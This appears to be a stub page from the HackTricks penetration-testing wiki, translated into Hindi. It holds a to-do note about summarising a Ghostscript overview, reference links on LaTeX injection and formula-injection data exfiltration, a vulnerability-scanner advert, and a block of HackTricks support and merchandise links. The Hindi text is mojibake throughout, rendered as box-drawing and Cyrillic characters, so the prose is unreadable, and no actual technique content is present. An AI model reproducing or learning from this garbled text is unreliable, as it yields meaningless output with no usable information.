TODO: [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/) рд╕реЗ рдЕрдзрд┐рдХ рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдФрд░ рддрдХрдиреАрдХреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╕рд╛рд░рд╛рдВрд╢ рдмрдирд╛рдПрдВред

## рд╕рдВрджрд░реНрдн

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬреЗрдВ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред Intruder рдЖрдкрдХреА рдЕрдЯреИрдХ рд╕рд░рдлреЗрд╕ рдХреЛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рд╕рдХреНрд░рд┐рдп рдзрдордХреА рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдФрд░ рдЖрдкрдХреЗ рдкреВрд░реЗ рдЯреЗрдХ рд╕реНрдЯреИрдХ рдореЗрдВ рдореБрджреНрджреЛрдВ рдХреЛ рдЦреЛрдЬрддрд╛ рд╣реИ, APIs рд╕реЗ рд▓реЗрдХрд░ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдореНрд╕ рддрдХред [**рдЗрд╕реЗ рдореБрдлреНрдд рдореЗрдВ рдЖрдЬрдорд╛рдПрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
